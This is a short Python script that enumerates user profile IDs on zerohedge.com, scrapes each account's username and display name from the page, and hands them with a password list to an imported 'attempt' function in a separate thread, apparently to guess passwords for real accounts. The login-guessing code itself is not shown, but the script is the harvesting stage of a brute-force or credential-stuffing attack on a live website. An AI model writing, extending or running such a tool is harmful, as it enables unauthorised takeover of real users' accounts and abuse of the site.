import requests
import threading
from attempt import *

def evaluate(number, passwords):
	try:
		entry = [number]
		response = requests.get("http://zerohedge.com/user/" + \
			str(number)).text
		if "Page Not Found" not in response:
			entry.append(response[response.index("canonical") + \
				48:response.index("og:url") - 21])
			entry.append(response[response.index("<title>") + \
				7:response.index(" | Zero Hedge")])
			threading.Thread(target=attempt,
				args=(entry, passwords)).start()
	except Exception as error: pass
